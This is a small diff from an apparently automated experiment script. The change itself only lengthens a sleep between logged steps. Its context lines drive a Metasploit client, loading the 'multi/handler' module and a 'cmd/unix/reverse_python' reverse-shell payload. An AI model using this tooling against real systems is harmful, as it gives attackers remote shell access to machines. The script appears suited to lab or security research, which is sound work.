@@ -22,7 +22,7 @@ def main(argv):
     # start step 6
     output_time_file_start = 'time_step_5_start.txt'
     record_timestamp(folder, output_time_file_start)
-    time.sleep(2)
+    time.sleep(10)
 
     exploit = client.modules.use('exploit', 'multi/handler')
     payload = client.modules.use('payload', 'cmd/unix/reverse_python')
